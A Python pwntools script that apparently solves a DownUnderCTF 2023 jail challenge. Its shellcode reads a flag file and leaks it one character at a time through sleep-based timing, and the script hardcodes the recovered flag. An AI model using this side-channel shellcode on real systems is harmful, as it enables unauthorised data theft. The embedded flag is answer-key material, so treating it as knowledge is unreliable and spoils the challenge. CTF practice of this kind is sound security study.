from pwn import *
import time

def get_kth_char(k):
    # io = process('./jail')
    # io = gdb.debug('./jail', """
    #     start
    #     b *main+197
    # """)
    io = remote('2023.ductf.dev', '30010')
    context.binary = './jail'

    shellcode = ""
    shellcode += shellcraft.syscall(0, 0, 'rsp', 15)
    shellcode += shellcraft.syscall(257, 0, 'rsp', 0)
    shellcode += shellcraft.syscall(0, 'rax', 'rsp', 60)
    shellcode += f"mov bl, [rsp + {k}]"
    shellcode += """
        push 0
        sub rbx, 30
        push rbx
    """
    shellcode += shellcraft.syscall(35, 'rsp')
    shellcode += shellcraft.syscall(60, 0)
    shellcode = asm(shellcode)

    io.recvuntil(b'>')
    start_time = time.time()
    io.sendline(shellcode)
    # io.sendline(b'/tmp/flag\x00')
    io.sendline(b'/chal/flag.txt\x00')

    try:
        io.recvline(timeout=120)
    except EOFError:
        print("EOF")
        end_time = time.time()
        io.close()
        return end_time - start_time

# DUCTF
# ???: DUCTFZS1[[
# flag = "DUCTF{S@deADh@nN@l_aTU@dkS_aRe_Pr@tTy`cA@L@}"
flag = "DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}"
# flag = "DUCTF{S1de@@h@nN@l_aTU@dkS_aRe_Pr3tTy`cA@L@}"
# flag = list(flag)
# for k in range(len(flag) - 1, len(flag)):
for k in range(len(flag), 45):
    c = get_kth_char(k)
    print(c)
    c = round(c + 30)
    flag += chr(c)
    print(flag)
# DUCTF{S1de_h@nN3l_aTU4dkS_aRe_Pr3tTy`cA1L!}
# DUCTF{S1de_Ch@nN3l_aTU4dkS_aRe_Pr3tTy`cA1L!}